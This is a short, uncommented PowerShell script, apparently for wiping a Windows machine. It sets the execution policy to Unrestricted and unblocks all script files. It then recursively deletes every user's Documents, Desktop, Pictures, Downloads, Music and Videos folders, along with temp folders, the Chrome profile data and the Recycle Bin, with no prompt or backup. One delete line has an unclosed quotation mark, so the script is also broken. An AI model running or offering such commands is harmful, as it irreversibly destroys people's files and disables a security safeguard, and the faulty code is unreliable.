Set-ExecutionPolicy Unrestricted
ls -Recurse *.ps1 | Unblock-File
ls -Recurse *.psm1 | Unblock-File

Get-ChildItem "C:\Users" | ?{ $_.PSIsContainer }  | % {gci (Join-Path $_.FullName Downloads) -Recurse} | %{Remove-Item $_.FullName -Verbose};
Get-ChildItem "C:\Users" | ?{ $_.PSIsContainer }  | % {gci (Join-Path $_.FullName Documents) -Recurse} | %{Remove-Item $_.FullName -Verbose};
Get-ChildItem "C:\Users" | ?{ $_.PSIsContainer }  | % {gci (Join-Path $_.FullName Music) -Recurse} | %{Remove-Item $_.FullName -Verbose};
Get-ChildItem "C:\Users" | ?{ $_.PSIsContainer }  | % {gci (Join-Path $_.FullName Videos) -Recurse} | %{Remove-Item $_.FullName -Verbose};
Get-ChildItem "C:\Users" | ?{ $_.PSIsContainer }  | % {gci (Join-Path $_.FullName Pictures) -Recurse} | %{Remove-Item $_.FullName -Verbose};
Get-ChildItem "C:\Users" | ?{ $_.PSIsContainer }  | % {gci (Join-Path $_.FullName Desktop) -Recurse} | %{Remove-Item $_.FullName -Verbose};
 
 del C:\Windows\Temp\*.*;
 del "C:\ProgramData\Package Cache\*.*";
 del "C:\Users\mobile\AppData\Local\Google\Chrome\User Data\Default\*.*;
 del C:\Users\mobile\AppData\Local\Temp\*.* 

 del 'C:\$Recycle.Bin';
